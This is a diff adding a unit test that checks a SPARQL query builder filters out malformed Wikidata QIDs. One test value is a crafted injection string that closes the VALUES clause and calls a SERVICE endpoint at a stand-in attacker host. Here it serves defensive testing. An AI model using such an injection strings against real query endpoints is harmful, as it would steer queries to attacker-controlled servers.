@@ -103,6 +103,18 @@ describe("buildValuesClause", () => {
   it("returns an empty string for an empty candidate list", () => {
     expect(buildValuesClause([])).toBe("");
   });
+
+  // The invariant that a qid is shaped like Q\d+ was previously held one
+  // function away, in candidatesFromSearchResponse: buildValuesClause itself
+  // mapped every input unconditionally. It is exported and directly unit
+  // tested, so a future second caller that skips that upstream filter would
+  // reopen the SPARQL injection hole silently. Filtering here makes the
+  // invariant local to the function that actually interpolates into SPARQL.
+  it("drops a crafted qid that would close the VALUES clause, even when passed directly", () => {
+    const injected = 'Q1 } SERVICE <https://attacker.example/sparql> { ?s ?p ?o';
+    expect(buildValuesClause([injected])).toBe("");
+    expect(buildValuesClause(["Q1", injected, "Q2"])).toBe("wd:Q1 wd:Q2");
+  });
 });
 
 describe("candidatesFromSearchResponse", () => {
